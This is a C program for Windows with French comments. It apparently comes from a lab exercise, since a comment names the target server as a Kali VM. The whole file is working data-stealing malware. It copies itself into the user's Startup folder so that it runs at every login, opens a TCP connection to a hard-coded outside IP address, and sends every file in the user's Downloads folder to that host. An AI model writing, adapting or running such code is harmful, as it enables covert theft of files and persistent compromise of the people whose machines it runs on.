#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <windows.h>
#include <shlobj.h>
#include <shlwapi.h>
 
#pragma comment(lib, "ws2_32.lib")  // Linker pour la bibliothèque Winsock
#pragma comment(lib, "Shlwapi.lib") // Linker pour la bibliothèque Shlwapi
 
#define SERVER_IP "72.20.10.2"  // Adresse IP de votre VM Kali
#define SERVER_PORT 8080
#define BUFFER_SIZE 1024
 
// Fonction pour transférer un fichier
void transfer_file(const char *file_path, SOCKET sock) {
    FILE *file = fopen(file_path, "rb");
    if (file == NULL) {
        printf("Erreur lors de l'ouverture du fichier %s.\n", file_path);
        return;
    }
 
    char buffer[BUFFER_SIZE];
    int bytes_read;
    while ((bytes_read = fread(buffer, sizeof(char), BUFFER_SIZE, file)) > 0) {
        if (send(sock, buffer, bytes_read, 0) < 0) {
            printf("Échec de l'envoi des données du fichier %s.\n", file_path);
            fclose(file);
            return;
        }
    }
 
    printf("Fichier %s envoyé avec succès !\n", file_path);
    fclose(file);
}
 
// Fonction pour copier l'exécutable dans le dossier Startup
void copy_to_startup() {
    char startup_path[MAX_PATH];
    char exe_path[MAX_PATH];
 
    // Obtenir le chemin du dossier Startup
    if (SHGetFolderPath(NULL, CSIDL_STARTUP, NULL, 0, startup_path) != S_OK) {
        printf("Erreur lors de l'obtention du chemin du dossier Startup.\n");
        return;
    }
 
    // Obtenir le chemin de l'exécutable actuel
    if (GetModuleFileName(NULL, exe_path, MAX_PATH) == 0) {
        printf("Erreur lors de l'obtention du chemin de l'exécutable.\n");
        return;
    }
 
    // Construire le chemin complet vers le nouvel emplacement
    strcat(startup_path, "\\MonProgramme.exe");
 
    // Copier l'exécutable dans le dossier Startup
    if (!CopyFile(exe_path, startup_path, FALSE)) {
        printf("Erreur lors de la copie de l'exécutable dans le dossier Startup.\n");
    } else {
        printf("Exécutable copié avec succès dans le dossier Startup !\n");
    }
}
 
int main() {
    // Copie l'exécutable dans le dossier Startup
    copy_to_startup();
 
    WSADATA wsa;
    SOCKET sock;
    struct sockaddr_in server;
 
    // Initialisation de Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        printf("Échec de l'initialisation de Winsock. Code d'erreur : %d\n", WSAGetLastError());
        return 1;
    }
 
    // Création de la socket
    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) {
        printf("Erreur de création de la socket : %d\n", WSAGetLastError());
        WSACleanup();
        return 1;
    }
 
    server.sin_addr.s_addr = inet_addr(SERVER_IP);
    server.sin_family = AF_INET;
    server.sin_port = htons(SERVER_PORT);
 
    // Connexion au serveur
    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0) {
        printf("Connexion échouée. Erreur : %d\n", WSAGetLastError());
        closesocket(sock);
        WSACleanup();
        return 1;
    }
 
    printf("Connecté au serveur !\n");
 
    // Obtenir le chemin du dossier Downloads
    char download_path[MAX_PATH];
    if (SHGetFolderPath(NULL, CSIDL_PROFILE, NULL, 0, download_path) != S_OK) {
        printf("Erreur lors de l'obtention du chemin du dossier utilisateur.\n");
        closesocket(sock);
        WSACleanup();
        return 1;
    }
    strcat(download_path, "\\Downloads");
 
    // Utiliser FindFirstFile et FindNextFile pour parcourir les fichiers
    WIN32_FIND_DATA find_data;
    HANDLE hFind = INVALID_HANDLE_VALUE;
 
    char search_path[MAX_PATH];
    snprintf(search_path, sizeof(search_path), "%s\\*", download_path);
 
    hFind = FindFirstFile(search_path, &find_data);
    if (hFind == INVALID_HANDLE_VALUE) {
        printf("Erreur lors de l'ouverture du dossier Downloads.\n");
        closesocket(sock);
        WSACleanup();
        return 1;
    }
 
    do {
        if (!(find_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
            char file_path[MAX_PATH];
            snprintf(file_path, sizeof(file_path), "%s\\%s", download_path, find_data.cFileName);
            transfer_file(file_path, sock);  // Transférer chaque fichier
        }
    } while (FindNextFile(hFind, &find_data) != 0);
 
    FindClose(hFind);
    closesocket(sock);
    WSACleanup();
    return 0;
}
